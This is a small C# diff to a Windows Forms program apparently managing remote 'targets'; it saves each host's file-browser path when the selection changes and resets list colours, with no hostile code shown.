@@ -802,10 +802,18 @@ namespace bantam_php
                     treeViewFileBrowser.Nodes.Clear();
                 }
 
+                if (!string.IsNullOrEmpty(g_SelectedTarget) 
+                 && Hosts.ContainsKey(g_SelectedTarget) 
+                 && !string.IsNullOrEmpty(Hosts[g_SelectedTarget].CWD))
+                {
+                    Hosts[g_SelectedTarget].CWD = txtBoxFileBrowserPath.Text;
+                }
+
                 g_SelectedTarget = lvi.SubItems[0].Text;
 
                 foreach (ListViewItem lvClients in listViewClients.Items)
                 {
+                    //dis is a bug what if they were red...
                     lvClients.BackColor = System.Drawing.SystemColors.Window;
                     lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                 }
